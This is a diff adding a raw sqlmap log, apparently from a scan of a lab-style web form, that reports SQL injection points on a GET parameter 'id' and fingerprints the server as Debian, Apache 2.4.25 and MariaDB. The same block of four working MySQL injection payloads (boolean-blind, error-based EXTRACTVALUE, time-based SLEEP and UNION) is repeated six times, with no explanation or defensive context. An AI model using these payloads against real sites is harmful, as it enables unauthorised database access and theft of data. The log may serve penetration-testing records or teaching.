@@ -1,0 +1,132 @@
+sqlmap identified the following injection point(s) with a total of 269 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4495=4495#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(1664,CONCAT(0x5c,0x71706b6a71,(SELECT (ELT(1664=1664,1))),0x717a767a71))-- RiTZ&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7968 FROM (SELECT(SLEEP(5)))TtJf)-- EQmE&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x636448596d77554551707169706f744b62554458795a4c6a497a534d647a445a4a4b63544c6a4854,0x717a767a71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4495=4495#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(1664,CONCAT(0x5c,0x71706b6a71,(SELECT (ELT(1664=1664,1))),0x717a767a71))-- RiTZ&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7968 FROM (SELECT(SLEEP(5)))TtJf)-- EQmE&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x636448596d77554551707169706f744b62554458795a4c6a497a534d647a445a4a4b63544c6a4854,0x717a767a71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4495=4495#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(1664,CONCAT(0x5c,0x71706b6a71,(SELECT (ELT(1664=1664,1))),0x717a767a71))-- RiTZ&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7968 FROM (SELECT(SLEEP(5)))TtJf)-- EQmE&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x636448596d77554551707169706f744b62554458795a4c6a497a534d647a445a4a4b63544c6a4854,0x717a767a71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4495=4495#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(1664,CONCAT(0x5c,0x71706b6a71,(SELECT (ELT(1664=1664,1))),0x717a767a71))-- RiTZ&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7968 FROM (SELECT(SLEEP(5)))TtJf)-- EQmE&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x636448596d77554551707169706f744b62554458795a4c6a497a534d647a445a4a4b63544c6a4854,0x717a767a71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4495=4495#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(1664,CONCAT(0x5c,0x71706b6a71,(SELECT (ELT(1664=1664,1))),0x717a767a71))-- RiTZ&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7968 FROM (SELECT(SLEEP(5)))TtJf)-- EQmE&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x636448596d77554551707169706f744b62554458795a4c6a497a534d647a445a4a4b63544c6a4854,0x717a767a71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4495=4495#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(1664,CONCAT(0x5c,0x71706b6a71,(SELECT (ELT(1664=1664,1))),0x717a767a71))-- RiTZ&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7968 FROM (SELECT(SLEEP(5)))TtJf)-- EQmE&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x636448596d77554551707169706f744b62554458795a4c6a497a534d647a445a4a4b63544c6a4854,0x717a767a71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
